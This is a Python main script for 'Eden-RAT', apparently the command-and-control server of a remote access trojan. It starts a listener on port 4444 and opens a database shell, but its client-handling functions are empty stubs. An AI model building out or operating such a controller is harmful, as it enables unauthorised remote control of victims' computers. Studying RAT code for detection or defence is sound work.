import argparse
import sys
import threading
import os

from lib.database import DB, Interactive as db_interactive
from lib import Listener
from lib.Client import Client
from lib.C2P import C2P
from lib.ColorPrint import ColorPrint as cp
from lib.EZCrypto import EZRSA, PRSA, Encoder

szBanner = '''
Project: Eden-RAT v1.0.0
Author: ISSAC
Github: https://github.com/Eden/
'''

parser = argparse.ArgumentParser()
parser.add_argument('-v', '--verbose', action='store_true', help='Show details.')
parser.add_argument('-l', '--listen', action='store_true', help='Listen')
parser.add_argument('-p', '--port', help='Bind port.')
parser.add_argument('--db', action='store_true', help='Database interactive shell')
args = parser.parse_args()

sql_db = None

dic_clnt = dict()

def combine_bytes(abFirst: bytes, nIdxFirst: int, nLenFirst: int, abSecond: bytes, nIdxSecond: int, nLenSecond: int) -> bytes:
    return abFirst[nIdxFirst:nIdxFirst + nLenFirst] + abSecond[nIdxSecond:nIdxSecond + nLenSecond]

def recv_handler(clnt: Client, nCmd: int, nParam: int, abMsg: bytes) -> Client:
    pass

def msg_handler(aMsg: list):
    pass  

def main():
    if os.name == 'nt':
        os.system('color')

    sql_db = DB()
    if not sql_db:
        cp.pf_err('Database initialization failed.')
        sys.exit(-1)

    if len(sys.argv) < 2:
        parser.print_help()

    if args.listen:
        ip = '0.0.0.0'
        port = 4444 if not args.port else int(args.port)

        listener = Listener.Listener(ip, port, args)

        t = threading.Thread(target=listener.listener_start_all, args=[])
        t.daemon = True
        t.start()

        listener.start()
    
    elif args.db:
        db_inter = db_interactive(sql_db)
        db_inter.do_interactive()

if __name__ == '__main__':
    main()